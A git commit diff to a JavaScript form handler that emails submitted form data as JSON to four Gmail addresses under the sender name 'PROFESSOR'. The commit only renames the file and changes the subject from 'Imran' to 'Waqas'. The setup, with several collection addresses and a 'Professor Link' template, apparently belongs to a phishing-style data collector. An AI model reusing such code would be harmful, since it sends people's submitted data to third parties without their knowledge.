50b664ce6ccfa98601ebd901dd43001a5db76b11
linkquarry-hub <linkquarry@gmail.com>
2025-11-26 16:59:53 +0500

    Update and rename Imran.js to Waqas.js

--- Waqas.js
+++ Waqas.js
@@ -42,7 +42,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <hgfver414@gmail.com>`,
       to: "tanveerking567832@gmail.com,linkquarry@gmail.com,submitdispute@gmail.com,newzatepage@gmail.com",
-      subject: "Imran",
+      subject: "Waqas",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
